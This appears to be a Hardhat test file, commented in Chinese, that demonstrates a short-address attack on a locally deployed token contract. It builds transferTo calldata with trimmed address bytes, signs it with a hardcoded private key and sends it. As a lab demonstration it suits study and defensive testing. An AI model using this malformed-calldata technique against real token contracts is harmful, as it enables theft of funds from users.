import { expect } from "chai";
import { ethers } from "hardhat";
import hre from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

describe("Test", () => {
  // let testAccount = "0xEAd54777D54C2C1bE1458E749fDfB5d654458309"
  let testPrivateKey = "0xa7b0f6c4cddc5c818655f5c0eb9e42f803dcc400ec284521e9092e8b243473c3"
  // const provider_default = new ethers.providers.JsonRpcProvider(); //默认localhost:8545

  let sender = new ethers.Wallet(testPrivateKey, hre.ethers.provider)

  async function deployFixture() {
    const Test = await ethers.getContractFactory("Test");
    const test = await Test.deploy();
    await test.deployed()
    console.log('deployed address:', test.address);
    return { test }
  }

  describe("Attack", async () => {

    it("test", async () => {
      const { test } = await loadFixture(deployFixture)
      let deployer = (await ethers.getSigners())[0]

      await deployer.sendTransaction({
        to: sender.address,
        value: ethers.utils.parseEther("50"),
      });

      console.log('deployer: ', deployer.address);

      await test.transferTo(sender.address, ethers.utils.parseEther("0.2"))
      console.log("balc of sender:", await test.BalanceOf(sender.address))

      //1. 构造攻击bytecode
      let transferToCode = test.interface.encodeFunctionData("transferTo", ["0xdfca6234eb09125632f8f3c71bf8733073b7cd00", 123])
      // 0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b
      // 0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b, 剪掉两个0
      console.log('transferToCode:', transferToCode);

      // 2. 发起攻击 
      const tx = {
        data: '0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b',//上面构造的 abi,贴进来，只有 134 个字节
        nonce: 0,//你发送交易的帐号的最后一笔交易的 nonce + 1
        gasLimit: '0x2dc6c0',
        gasPrice: '0x2540be400',
        value: '0x0',
        to: test.address
      }

      let signedTx = await sender.signTransaction(tx)
      console.log('signedTx:', signedTx);

      // 1. signTransaction
      // 2. provider.sendTransaction
      await expect(sender.sendTransaction(tx)).emit(test, "TransferTo").withArgs(
        "0xDFCa6234EB09125632f8F3c71Bf8733073b7CD00", "123"
      )
    });
  });
});
